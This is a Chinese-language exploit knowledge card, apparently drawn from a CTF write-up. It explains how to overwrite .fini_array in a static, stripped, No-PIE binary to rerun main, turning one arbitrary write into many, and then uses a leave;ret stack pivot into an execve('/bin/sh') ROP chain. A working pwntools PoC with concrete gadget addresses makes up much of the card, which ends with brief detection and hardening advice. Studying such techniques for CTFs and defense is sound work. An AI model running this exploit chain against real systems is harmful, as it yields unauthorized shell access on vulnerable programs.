---
id: binary-pwn-fini-array-loop-leave-ret-pivot-rop
title: fini_array 循环复用任意写 + leave_ret 栈迁移：静态无符号二进制在退出链上布置 execve ROP
type: scenario
domain: binary
path: binary/pwn/rop
technique: fini-array-loop-leave-ret-pivot-rop
aliases:
- fini_array 循环
- fini_array 改 main 重跑
- leave_ret 栈迁移
- 静态二进制 fini_array
- csu_fini main loop
- 退出链 ROP
tags:
- pwn
- fini-array
- static
- leave-ret
- stack-pivot
- rop
- arbitrary-write
- stripped
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V583
  verified_at: '2026-11-12T12:46:22+08:00'
  notes: 已对照原文核对：图15静态stripped、图14 Partial RELRO/NX、图17 fini_array 0x4b80b0、图18 [0]=0x402cb0/[1]=0x401c1d、图20 ROP链地址、图21 leave_ret 0x401cf3/ret 0x401016、图22 拿到shell 均与卡一致；任意写原语已按图16修正为0xC8字节缓冲(首8字节为地址)+0x18字节写；退出链执行顺序描述以原文叙述为准并注明需本地调试；dedup 与格式化字符串 fini_array 卡、stack-pivot 卡非同链。
---

## 一句话结论

在静态链接、去符号、No PIE 的二进制中，若每次 `main` 只提供一次任意地址写，可先把 `.fini_array[0]` 改成 `__libc_csu_fini`、`.fini_array[1]` 改成 `main`，利用 `.fini_array` 逆序执行的特性让 `main` 反复重跑，从而获得多次任意写；在栈上布置好 `execve("/bin/sh",0,0)` 的 ROP 链后，再把 `[0]` 改成 `leave; ret`、`[1]` 改成 `ret`，程序退出时经 `leave; ret` 栈迁移滑入 ROP 链，调用 syscall 拿 shell。

## 原理

- `.fini_array` 是终止函数指针数组，退出时按**逆序**执行：先 `[1]` 后 `[0]`。静态二进制中该数组通常包含 `__libc_csu_fini`/`__do_global_dtors_aux` 等；把 `[1]` 改成 `main`、`[0]` 改成 `__libc_csu_fini`，每次程序退出都会先再次执行 `main`，再执行 `csu_fini`，形成“main 循环”，把原来只有一次的任意写变成任意多次。
- `__libc_csu_fini` 自身也会遍历 `.fini_array`（不同链接器/glibc 版本行为略有差异），与 `[1]=main` 配合可稳定重跑 main；实际利用以本地调试确认执行顺序为准。
- **栈迁移**：`leave` = `mov rsp, rbp; pop rbp`，`ret` 弹出返回地址。退出链执行 `[1]` 的 `ret` 后会继续执行 `[2]`（紧邻 `.fini_array` 的栈/数据位置），把 ROP 链放在 `[2]` 起始处；`[0]` 的 `leave; ret` 把 `rsp` 切到该区域，`ret` 逐个消费链上的 gadget。
- **ROP 链**：静态二进制没有 libc，但自带 `pop rax; ret`、`pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret`、`syscall` 等 gadget，可直接布置 `rax=59`、`rdi=&"/bin/sh"`、`rsi=0`、`rdx=0`、`syscall` 调 `execve`；`"/bin/sh"` 可写在 `.bss`/`.data` 的可读地址。
- 原文的地址：`fini_array=0x4b80b0`、`__libc_csu_fini=0x402cb0`、`main=0x401c1d`、`leave_ret=0x401cf3`、`ret=0x401016`、`esp=0x4b80c0`（fini_array+0x10，链起点）、`pop rax=0x448fcc`、`pop rdi=0x401746`、`pop rsi=0x406f80`、`pop rdx=0x448415`、`syscall=0x402514`、`"/bin/sh"=0x492895`。

## 触发条件

- 静态链接、No PIE（地址固定）、去符号也可（用 gadget 扫描/调试定位）。
- 存在每次 `main` 执行一次的任意地址写（写 qword/指针），且可反复进入 `main`。
- `.fini_array` 可写（No/Partial RELRO），且程序退出时会执行 `.fini_array`。
- 二进制中可找到 `leave; ret`、`ret` 与 syscall 所需 gadget；有可读的 `"/bin/sh"` 字符串或可写 BSS。

## 利用步骤

1. `checksec` 与 `file`：确认静态、No PIE、Partial RELRO、NX；`elfheader` 定位 `.fini_array`（示例 0x4b80b0）与 `.bss`。
2. 逆向 `main`：确认任意写原语（示例：先读入 0xC8 字节缓冲、其首 8 字节作为目标地址，再向该地址写入最多 0x18 字节数据；每次 main 一次）及每次运行可写的次数。
3. 第一次写：`.fini_array[0]=__libc_csu_fini`、`.fini_array[1]=main`（一条 qword 写覆盖 16 字节，如 `p64(csu_fini)+p64(main)`），使程序退出后循环重跑 main，获得多次任意写。
4. 在 `fini_array+0x10`（示例 0x4b80c0）布置 ROP：`pop rax; 59; pop rdi; "/bin/sh"; pop rsi; 0; pop rdx; 0; syscall`。
5. 最后写：`.fini_array[0]=leave_ret`、`.fini_array[1]=ret`；程序退出时先经 `[0]` 的 `leave; ret` 完成栈迁移，随后沿 `[1]` 的 `ret` 滑入 `[2]` 起始处的 ROP 链（执行顺序以本地调试为准）。
6. 收到 shell 后交互。

## PoC

```python
# 静态无符号二进制：地址来自原文示例
syscall      = 0x0402514
pop_rax      = 0x0448fcc
pop_rdx      = 0x0448415
pop_rsi      = 0x0406f80
pop_rdi      = 0x0401746
bin_sh       = 0x0492895
fini_array   = 0x04B80B0
main_addr    = 0x0401C1D
csu_fini     = 0x0402CB0
leave_ret    = 0x0401CF3
chain        = 0x04B80C0   # fini_array + 0x10
ret          = 0x0401016

def write(addr, data):
    p.sendafter('addr:', p64(addr))
    p.sendafter('data:', data)

# 1) fini_array[0]=csu_fini, [1]=main -> main 循环，获得多次写
write(fini_array, p64(csu_fini) + p64(main_addr))

# 2) 在 fini_array 后布置 execve("/bin/sh",0,0) ROP 链
write(chain + 0x00, p64(pop_rax))
write(chain + 0x08, p64(0x3b))
write(chain + 0x10, p64(pop_rdi))
write(chain + 0x18, p64(bin_sh))
write(chain + 0x20, p64(pop_rsi))
write(chain + 0x28, p64(0))
write(chain + 0x30, p64(pop_rdx))
write(chain + 0x38, p64(0))
write(chain + 0x40, p64(syscall))

# 3) fini_array[0]=leave_ret, [1]=ret -> 退出时栈迁入 ROP 链
write(fini_array, p64(leave_ret) + p64(ret))
p.interactive()
```

## 变体与关联

- 变体：`[1]=main` 的循环也可用于“多次任意读/多次格式化字符串写”的配合；不同 libc/链接器下 `__libc_csu_fini` 遍历 fini_array 的行为需本地确认。
- 变体：动态二进制可把 ROP 换成 ret2libc（`system("/bin/sh")`）；静态二进制无 libc 时用 syscall 链（如本例）。
- 变体：若可写 `.init_array`，也可在下次启动时劫持；若 `.fini_array` 只读（Full RELRO）则不可用。
- 关联：[[binary-pwn-fini-array-hijack-bss-shellcode]]（同篇的 fini_array 指向 BSS shellcode 变体）、[[binary-pwn-format-string-non-stack-fini-array-loop-write]]（格式化字符串下的 fini_array 循环写返回地址）、[[binary-pwn-stack-pivot-leave-ret-bss]]（leave_ret 栈迁移通用卡）、[[binary-pwn-rop-static-link-ret2system-sh]]（静态二进制 ret2system）。
- 边界：Full RELRO（fini_array 只读）、PIE（地址随机）、`.fini_array` 不执行（`_exit`/异常退出）、找不到 leave_ret 或 syscall gadget、静态二进制中 gadget 受 badchar 限制时失效。

## 检测与防御

- 检测：运行期 `.fini_array` 被改写；退出时跳转到 `.bss`/`.data` 或非预期函数；ROP 链特征（连续 `pop`/`syscall`）；checksec 基线发现 Partial/No RELRO。
- 防御：Full RELRO（`-Wl,-z,relro,-z,now`）、PIE、NX + 无 RWX 段、stack canary；对 `.fini_array`/`.init_array`/GOT 做只读映射或完整性监控；静态链接时保留符号并审计异常控制流。
